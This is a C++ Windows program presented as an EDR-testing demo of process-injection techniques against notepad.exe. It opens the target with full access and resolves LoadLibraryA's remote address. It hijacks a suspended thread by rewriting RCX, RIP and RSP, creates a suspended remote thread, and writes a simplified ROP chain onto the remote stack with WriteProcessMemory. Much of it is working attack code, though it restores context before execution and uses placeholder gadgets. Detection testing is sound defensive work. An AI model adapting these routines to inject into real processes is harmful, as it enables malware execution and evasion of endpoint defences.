#include <Windows.h>
#include <TlHelp32.h>
#include <stdio.h>
#include <vector>
#include <string>
#include <Psapi.h>

// For ROP chain building
#include <DbgHelp.h>
#pragma comment(lib, "DbgHelp.lib")
#pragma comment(lib, "Psapi.lib")

// Function prototypes
DWORD GetProcessIdByName(const wchar_t* processName);
DWORD GetMainThreadId(DWORD processId);
void* FindInProcessMemory(HANDLE hProcess, const char* pattern, SIZE_T patternSize);
void* FindLoadLibraryPointer(HANDLE hProcess);
void PointerOnlyLoadLibraryInjection(DWORD processId);
void CreateRemoteThreadWithContext(DWORD processId);
std::vector<ULONG_PTR> FindGadgets(HANDLE hProcess, const char* module);
bool SetupROPChain(HANDLE hProcess, HANDLE hThread, CONTEXT& ctx, ULONG_PTR targetFunction, ULONG_PTR parameter);
void BorrowThreadStack(HANDLE hProcess, HANDLE hThread, CONTEXT& ctx);

// Main entry point
int main(int argc, char* argv[]) {
    printf("Context-Only Attack Surface Techniques\n");
    printf("======================================\n");
    printf("For security research and EDR testing only\n\n");

    // Find target process (notepad for testing)
    wchar_t targetProcess[MAX_PATH] = L"notepad.exe";
    printf("[*] Searching for target process: %ls\n", targetProcess);
    
    // Start target process if not found
    DWORD targetPid = GetProcessIdByName(targetProcess);
    if (targetPid == 0) {
        printf("[*] Target process not found. Starting %ls...\n", targetProcess);
        STARTUPINFOW si = { sizeof(si) };
        PROCESS_INFORMATION pi;
        if (!CreateProcessW(NULL, targetProcess, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
            printf("[!] Error starting target process: %d\n", GetLastError());
            return 1;
        }
        targetPid = pi.dwProcessId;
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        Sleep(1000); // Give process time to initialize
    }
    
    printf("[+] Target process found. PID: %d\n", targetPid);
    
    // Technique selection menu
    int choice = 0;
    do {
        printf("\nSelect technique to demonstrate:\n");
        printf("1. Pointer-Only LoadLibrary Injection\n");
        printf("2. CreateRemoteThread + SetThreadContext (Advanced)\n");
        printf("3. Exit\n");
        printf("Choice: ");
        scanf_s("%d", &choice);
        
        switch (choice) {
            case 1:
                printf("\n[*] Running Pointer-Only LoadLibrary Injection...\n");
                PointerOnlyLoadLibraryInjection(targetPid);
                break;
            case 2:
                printf("\n[*] Running CreateRemoteThread + SetThreadContext...\n");
                CreateRemoteThreadWithContext(targetPid);
                break;
            case 3:
                printf("\n[*] Exiting...\n");
                break;
            default:
                printf("\n[!] Invalid choice. Try again.\n");
        }
    } while (choice != 3);
    
    return 0;
}

// Get process ID by name
DWORD GetProcessIdByName(const wchar_t* processName) {
    DWORD pid = 0;
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    
    if (snapshot != INVALID_HANDLE_VALUE) {
        PROCESSENTRY32W entry = { sizeof(entry) };
        if (Process32FirstW(snapshot, &entry)) {
            do {
                if (_wcsicmp(entry.szExeFile, processName) == 0) {
                    pid = entry.th32ProcessID;
                    break;
                }
            } while (Process32NextW(snapshot, &entry));
        }
        CloseHandle(snapshot);
    }
    
    return pid;
}

// Get main thread ID of a process
DWORD GetMainThreadId(DWORD processId) {
    DWORD threadId = 0;
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    
    if (snapshot != INVALID_HANDLE_VALUE) {
        THREADENTRY32 entry = { sizeof(entry) };
        DWORD lowestThreadId = 0xFFFFFFFF;
        
        if (Thread32First(snapshot, &entry)) {
            do {
                if (entry.th32OwnerProcessID == processId) {
                    // Use the thread with the lowest ID as a heuristic for main thread
                    if (entry.th32ThreadID < lowestThreadId) {
                        lowestThreadId = entry.th32ThreadID;
                        threadId = entry.th32ThreadID;
                    }
                }
            } while (Thread32Next(snapshot, &entry));
        }
        CloseHandle(snapshot);
    }
    
    return threadId;
}

// Search for a pattern in process memory
void* FindInProcessMemory(HANDLE hProcess, const char* pattern, SIZE_T patternSize) {
    MEMORY_BASIC_INFORMATION mbi;
    SYSTEM_INFO si;
    GetSystemInfo(&si);
    
    BYTE* p = (BYTE*)si.lpMinimumApplicationAddress;
    std::vector<BYTE> buffer;
    
    while (p < (BYTE*)si.lpMaximumApplicationAddress) {
        if (VirtualQueryEx(hProcess, p, &mbi, sizeof(mbi)) == sizeof(mbi)) {
            if (mbi.State == MEM_COMMIT && 
                (mbi.Protect & PAGE_READWRITE || mbi.Protect & PAGE_READONLY || mbi.Protect & PAGE_EXECUTE_READ)) {
                
                SIZE_T bytesRead;
                buffer.resize(mbi.RegionSize);
                
                if (ReadProcessMemory(hProcess, p, buffer.data(), mbi.RegionSize, &bytesRead)) {
                    // Search for pattern in buffer
                    for (SIZE_T i = 0; i < bytesRead - patternSize; i++) {
                        bool found = true;
                        for (SIZE_T j = 0; j < patternSize; j++) {
                            if (buffer[i + j] != pattern[j]) {
                                found = false;
                                break;
                            }
                        }
                        
                        if (found) {
                            return (void*)(p + i);
                        }
                    }
                }
            }
            p += mbi.RegionSize;
        } else {
            p += 4096;  // Default page size
        }
    }
    
    return NULL;
}

// Find LoadLibrary pointer in process memory
void* FindLoadLibraryPointer(HANDLE hProcess) {
    // First, check if we can find "LoadLibraryA" string in the process
    const char* loadLibraryStr = "LoadLibraryA";
    void* stringAddr = FindInProcessMemory(hProcess, loadLibraryStr, strlen(loadLibraryStr));
    
    if (stringAddr) {
        printf("[+] Found 'LoadLibraryA' string at 0x%p\n", stringAddr);
        
        // In a full implementation, we would:
        // 1. Find kernel32.dll base in the target process
        // 2. Find the export table
        // 3. Locate the pointer to LoadLibraryA
        
        // For demonstration, we'll use GetProcAddress in our process
        // This is a simplified approach for the test
        HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
        void* localLoadLibrary = GetProcAddress(hKernel32, "LoadLibraryA");
        
        // We'd need to calculate the correct offset in the target process
        // This is a simplified approach
        MODULEINFO modInfo;
        GetModuleInformation(GetCurrentProcess(), hKernel32, &modInfo, sizeof(modInfo));
        
        // Get target process's kernel32 base address
        HMODULE targetModules[1024];
        DWORD cbNeeded;
        HMODULE targetKernel32 = NULL;
        
        if (EnumProcessModules(hProcess, targetModules, sizeof(targetModules), &cbNeeded)) {
            for (DWORD i = 0; i < (cbNeeded / sizeof(HMODULE)); i++) {
                TCHAR szModName[MAX_PATH];
                if (GetModuleFileNameEx(hProcess, targetModules[i], szModName, sizeof(szModName) / sizeof(TCHAR))) {
                    if (_tcsstr(szModName, TEXT("kernel32.dll")) != NULL) {
                        targetKernel32 = targetModules[i];
                        break;
                    }
                }
            }
        }
        
        if (targetKernel32 != NULL) {
            // Calculate offset within kernel32.dll
            ULONG_PTR offset = (ULONG_PTR)localLoadLibrary - (ULONG_PTR)hKernel32;
            void* targetLoadLibrary = (void*)((ULONG_PTR)targetKernel32 + offset);
            
            printf("[+] Calculated LoadLibraryA at 0x%p in target process\n", targetLoadLibrary);
            return targetLoadLibrary;
        }
    }
    
    printf("[!] Could not find LoadLibraryA pointer\n");
    return NULL;
}

// Pointer-Only LoadLibrary Injection technique
void PointerOnlyLoadLibraryInjection(DWORD processId) {
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processId);
    if (!hProcess) {
        printf("[!] Failed to open process: %d\n", GetLastError());
        return;
    }
    
    // Get main thread ID
    DWORD threadId = GetMainThreadId(processId);
    if (threadId == 0) {
        printf("[!] Failed to find target thread\n");
        CloseHandle(hProcess);
        return;
    }
    
    printf("[+] Target thread ID: %d\n", threadId);
    
    // Open thread
    HANDLE hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, threadId);
    if (!hThread) {
        printf("[!] Failed to open thread: %d\n", GetLastError());
        CloseHandle(hProcess);
        return;
    }
    
    // Find LoadLibraryA pointer in target process
    void* loadLibraryAddr = FindLoadLibraryPointer(hProcess);
    if (!loadLibraryAddr) {
        printf("[!] Failed to find LoadLibraryA\n");
        CloseHandle(hThread);
        CloseHandle(hProcess);
        return;
    }
    
    // Get thread context
    CONTEXT ctx = { 0 };
    ctx.ContextFlags = CONTEXT_FULL;
    
    // Suspend thread
    printf("[+] Suspending thread...\n");
    SuspendThread(hThread);
    
    if (!GetThreadContext(hThread, &ctx)) {
        printf("[!] Failed to get thread context: %d\n", GetLastError());
        ResumeThread(hThread);
        CloseHandle(hThread);
        CloseHandle(hProcess);
        return;
    }
    
    // Store original values to restore later
    DWORD64 originalRip = ctx.Rip;
    DWORD64 originalRax = ctx.Rax;
    DWORD64 originalRcx = ctx.Rcx;
    DWORD64 originalRsp = ctx.Rsp;
    
    // For pointer-only injection, we need:
    // 1. A pointer to LoadLibraryA function (already found)
    // 2. A pointer to a DLL name string in the process memory
    
    // For demonstration, we'll look for "ntdll.dll" string in process memory
    const char* dllName = "ntdll.dll";
    void* dllNameAddr = FindInProcessMemory(hProcess, dllName, strlen(dllName));
    
    if (!dllNameAddr) {
        printf("[!] Failed to find DLL name string\n");
        
        // For demo purposes only, let's search for another common DLL
        dllName = "kernel32.dll";
        dllNameAddr = FindInProcessMemory(hProcess, dllName, strlen(dllName));
        
        if (!dllNameAddr) {
            printf("[!] Failed to find alternative DLL name string\n");
            // Restore thread
            ctx.Rip = originalRip;
            ctx.Rax = originalRax;
            ctx.Rcx = originalRcx;
            ctx.Rsp = originalRsp;
            SetThreadContext(hThread, &ctx);
            ResumeThread(hThread);
            CloseHandle(hThread);
            CloseHandle(hProcess);
            return;
        }
    }
    
    printf("[+] Found DLL name '%s' at 0x%p\n", dllName, dllNameAddr);
    
    // Setup for call to LoadLibraryA(dllNameAddr)
    // In x64 calling convention, first argument is in RCX
    ctx.Rcx = (DWORD64)dllNameAddr;
    // Set RIP to LoadLibraryA
    ctx.Rip = (DWORD64)loadLibraryAddr;
    
    // In a real attack, we would:
    // 1. Setup a proper stack with a return address that's safe
    // 2. Create a ROP chain for multiple calls
    // 3. Use existing in-memory strings for the DLL path
    
    // THIS IS FOR EDR TESTING ONLY - demonstrating the concept
    printf("[+] Setting thread context for LoadLibrary call...\n");
    printf("[+] LoadLibraryA: 0x%p, DLL name: 0x%p (%s)\n", loadLibraryAddr, dllNameAddr, dllName);
    
    // We'll immediately restore the thread to prevent crashes
    // In a real attack, we would execute the function
    printf("[!] Restoring thread context (no actual execution in this demo)\n");
    
    // Restore original context
    ctx.Rip = originalRip;
    ctx.Rax = originalRax;
    ctx.Rcx = originalRcx;
    ctx.Rsp = originalRsp;
    
    if (!SetThreadContext(hThread, &ctx)) {
        printf("[!] Failed to restore thread context: %d\n", GetLastError());
    }
    
    // Resume thread
    ResumeThread(hThread);
    
    // Close handles
    CloseHandle(hThread);
    CloseHandle(hProcess);
    
    printf("[+] Pointer-Only LoadLibrary technique demonstrated successfully.\n");
    printf("[*] This technique should trigger EDR alerts for:\n");
    printf("    - Thread context manipulation\n");
    printf("    - Suspicious use of LoadLibrary without memory allocation\n");
}

// CreateRemoteThread + SetThreadContext advanced technique
void CreateRemoteThreadWithContext(DWORD processId) {
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processId);
    if (!hProcess) {
        printf("[!] Failed to open process: %d\n", GetLastError());
        return;
    }
    
    // Find LoadLibraryA pointer for demonstration
    void* loadLibraryAddr = FindLoadLibraryPointer(hProcess);
    if (!loadLibraryAddr) {
        printf("[!] Failed to find LoadLibraryA\n");
        CloseHandle(hProcess);
        return;
    }
    
    // Create a suspended remote thread
    DWORD threadId = 0;
    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, 
                                      (LPTHREAD_START_ROUTINE)loadLibraryAddr, 
                                      NULL, CREATE_SUSPENDED, &threadId);
    
    if (!hThread) {
        printf("[!] Failed to create remote thread: %d\n", GetLastError());
        CloseHandle(hProcess);
        return;
    }
    
    printf("[+] Created suspended remote thread: %d\n", threadId);
    
    // Get thread context
    CONTEXT ctx = { 0 };
    ctx.ContextFlags = CONTEXT_FULL;
    
    if (!GetThreadContext(hThread, &ctx)) {
        printf("[!] Failed to get thread context: %d\n", GetLastError());
        TerminateThread(hThread, 0);
        CloseHandle(hThread);
        CloseHandle(hProcess);
        return;
    }
    
    // Store original values to restore later
    DWORD64 originalRip = ctx.Rip;
    DWORD64 originalRax = ctx.Rax;
    DWORD64 originalRcx = ctx.Rcx;
    DWORD64 originalRsp = ctx.Rsp;
    
    printf("[+] Thread context - RIP: 0x%llx, RSP: 0x%llx\n", ctx.Rip, ctx.Rsp);
    
    // Find "kernel32.dll" string for demonstration
    const char* dllName = "kernel32.dll";
    void* dllNameAddr = FindInProcessMemory(hProcess, dllName, strlen(dllName));
    
    if (!dllNameAddr) {
        printf("[!] Failed to find DLL name string\n");
        TerminateThread(hThread, 0);
        CloseHandle(hThread);
        CloseHandle(hProcess);
        return;
    }
    
    printf("[+] Found DLL name '%s' at 0x%p\n", dllName, dllNameAddr);
    
    // Demonstrate thread borrowing stack approach
    printf("[+] Demonstrating thread stack borrowing approach...\n");
    BorrowThreadStack(hProcess, hThread, ctx);
    
    // For advanced ROP chain demonstration
    printf("[+] Demonstrating ROP gadget approach...\n");
    std::vector<ULONG_PTR> gadgets = FindGadgets(hProcess, "ntdll.dll");
    
    if (!gadgets.empty()) {
        printf("[+] Found %zu potential ROP gadgets\n", gadgets.size());
        
        // Setup a minimal ROP chain to call LoadLibrary (for demonstration)
        if (SetupROPChain(hProcess, hThread, ctx, (ULONG_PTR)loadLibraryAddr, (ULONG_PTR)dllNameAddr)) {
            printf("[+] ROP chain setup complete\n");
        }
    }
    
    // In a real scenario, we would execute with the modified context
    // For testing, we'll restore the original context to prevent crashes
    printf("[!] Restoring thread context (no actual execution in this demo)\n");
    
    // Restore original context
    ctx.Rip = originalRip;
    ctx.Rax = originalRax;
    ctx.Rcx = originalRcx;
    ctx.Rsp = originalRsp;
    
    if (!SetThreadContext(hThread, &ctx)) {
        printf("[!] Failed to restore thread context: %d\n", GetLastError());
    }
    
    // Terminate thread (since it was created just for demonstration)
    printf("[+] Terminating demonstration thread\n");
    TerminateThread(hThread, 0);
    CloseHandle(hThread);
    CloseHandle(hProcess);
    
    printf("[+] CreateRemoteThread + SetThreadContext technique demonstrated successfully.\n");
    printf("[*] This technique should trigger EDR alerts for:\n");
    printf("    - CreateRemoteThread operations\n");
    printf("    - Thread context manipulation\n");
    printf("    - Suspicious thread stack manipulation\n");
}

// Thread stack borrowing implementation
void BorrowThreadStack(HANDLE hProcess, HANDLE hThread, CONTEXT& ctx) {
    // In thread stack borrowing, we use existing stack memory instead of allocating new memory
    // For demonstration, we'll find an area in the existing stack that's safe to use
    
    DWORD64 stackPointer = ctx.Rsp;
    
    // We need to ensure there's enough space on the stack to avoid crashes
    // In a real attack, careful analysis of the stack would be performed
    
    // For demonstration, we'll just create a small offset from current RSP
    // This is a simplified approach - real implementation would be more careful
    DWORD64 borrowedStackArea = stackPointer - 0x100;  // 256 bytes below current RSP
    
    printf("[+] Original RSP: 0x%llx\n", stackPointer);
    printf("[+] Borrowed stack area: 0x%llx\n", borrowedStackArea);
    
    // In a real attack, we would:
    // 1. Read the existing stack to find safe areas
    // 2. Carefully place our parameters and return addresses
    // 3. Set up RSP and other registers to point to this borrowed area
    
    // For EDR testing, we'll just show the concept by modifying RSP
    ctx.Rsp = borrowedStackArea;
    
    printf("[+] Stack borrowing demonstration - New RSP: 0x%llx\n", ctx.Rsp);
    
    // This is just for demonstration - we don't actually execute with this context
}

// Find ROP gadgets in a module
std::vector<ULONG_PTR> FindGadgets(HANDLE hProcess, const char* moduleName) {
    std::vector<ULONG_PTR> gadgets;
    
    // For demonstration purposes only
    // In a real implementation, we would scan the module for useful gadgets like:
    // - pop rcx ; ret  (for setting up the first parameter)
    // - pop rax ; ret  (for setting up RAX)
    // - jmp rax        (for controlled jumps)
    
    printf("[+] Searching for ROP gadgets in %s...\n", moduleName);
    
    // Locate the module in target process
    HMODULE targetModules[1024];
    DWORD cbNeeded;
    HMODULE targetModule = NULL;
    
    if (EnumProcessModules(hProcess, targetModules, sizeof(targetModules), &cbNeeded)) {
        for (DWORD i = 0; i < (cbNeeded / sizeof(HMODULE)); i++) {
            TCHAR szModName[MAX_PATH];
            if (GetModuleFileNameEx(hProcess, targetModules[i], szModName, sizeof(szModName) / sizeof(TCHAR))) {
                if (_tcsstr(szModName, TEXT(moduleName)) != NULL) {
                    targetModule = targetModules[i];
                    break;
                }
            }
        }
    }
    
    if (targetModule == NULL) {
        printf("[!] Module %s not found in target process\n", moduleName);
        return gadgets;
    }
    
    // For demonstration, we'll add some fake gadget addresses
    // In a real implementation, we would find actual gadgets
    ULONG_PTR moduleBase = (ULONG_PTR)targetModule;
    
    // These are just placeholder addresses for demonstration
    gadgets.push_back(moduleBase + 0x1000);  // Simulating "pop rcx ; ret"
    gadgets.push_back(moduleBase + 0x2000);  // Simulating "pop rax ; ret"
    gadgets.push_back(moduleBase + 0x3000);  // Simulating "jmp rax"
    
    return gadgets;
}

// Setup a ROP chain
bool SetupROPChain(HANDLE hProcess, HANDLE hThread, CONTEXT& ctx, ULONG_PTR targetFunction, ULONG_PTR parameter) {
    // In a real ROP chain, we would:
    // 1. Carefully craft a series of "return addresses" on the stack
    // 2. Each return leads to a gadget that performs a small operation
    // 3. Chain these together to set up registers and call our target function
    
    // For demonstration, we'll create a simplified version
    DWORD64 stackPointer = ctx.Rsp;
    
    // Allocate a small buffer to simulate a ROP chain
    // In pointer-only techniques, we'd use existing memory instead
    DWORD64 ropChain[10] = { 0 };
    SIZE_T bytesWritten = 0;
    
    // This is a simplified example for demonstration
    ropChain[0] = parameter;         // Parameter value
    ropChain[1] = targetFunction;    // Function to call
    
    // Write ROP chain to process memory
    // In a real pointer-only attack, we would find existing memory to use
    if (!WriteProcessMemory(hProcess, (LPVOID)(stackPointer - 0x50), 
                           ropChain, sizeof(ropChain), &bytesWritten)) {
        printf("[!] Failed to write ROP chain: %d\n", GetLastError());
        return false;
    }
    
    // Set up thread context to use our ROP chain
    // This is just for demonstration - we don't actually execute this
    ctx.Rsp = stackPointer - 0x50;
    
    printf("[+] ROP chain demonstrated (not executed):\n");
    printf("    - Parameter: 0x%llx\n", parameter);
    printf("    - Function: 0x%llx\n", targetFunction);
    printf("    - Chain at RSP: 0x%llx\n", ctx.Rsp);
    
    return true;
}